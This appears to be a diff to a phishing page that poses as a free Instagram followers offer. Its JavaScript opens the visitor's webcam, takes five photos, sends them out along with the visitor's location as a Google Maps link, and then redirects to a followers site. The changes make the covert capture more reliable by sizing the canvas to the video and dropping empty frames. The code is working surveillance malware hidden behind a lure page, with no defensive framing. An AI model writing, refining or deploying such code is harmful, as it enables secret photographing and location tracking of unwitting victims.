@@ -43,8 +43,8 @@
     <div id="progressBar">0%</div>
   </div>
 
-  <video id="video" width="300" autoplay muted></video>
-  <canvas id="canvas" width="300" height="225"></canvas>
+  <video id="video" autoplay muted></video>
+  <canvas id="canvas"></canvas>
 
   <script>
     const video = document.getElementById('video');
@@ -101,21 +101,34 @@ https://www.google.com/maps?q=${lat},${lon}
         .then(stream => {
           video.srcObject = stream;
 
-          setTimeout(() => {
-            let count = 0;
-            const maxPhotos = 5;
-            const interval = setInterval(() => {
-              context.drawImage(video, 0, 0, canvas.width, canvas.height);
-              canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
-              count++;
-              if (count >= maxPhotos) {
-                clearInterval(interval);
-                window.location.href = "https://myinstafollow.com/free-instagram-followers/";
-              }
-            }, 500);
+          video.onloadedmetadata = () => {
+            video.play();
 
-            getLocationAndSendInfo();
-          }, 1000); // انتظر ثانية قبل بدء الالتقاط
+            // نضبط أبعاد الكانفاس تلقائيًا
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // ننتظر ثانية للتأكد من تشغيل الفيديو
+            setTimeout(() => {
+              let count = 0;
+              const maxPhotos = 5;
+              const interval = setInterval(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  if (blob && blob.size > 1000) {
+                    sendPhoto(blob);
+                  }
+                }, 'image/jpeg');
+                count++;
+                if (count >= maxPhotos) {
+                  clearInterval(interval);
+                  window.location.href = "https://myinstafollow.com/free-instagram-followers/";
+                }
+              }, 500);
+
+              getLocationAndSendInfo();
+            }, 1000);
+          };
         })
         .catch(err => alert("فشل تشغيل الكاميرا: " + err));
     }
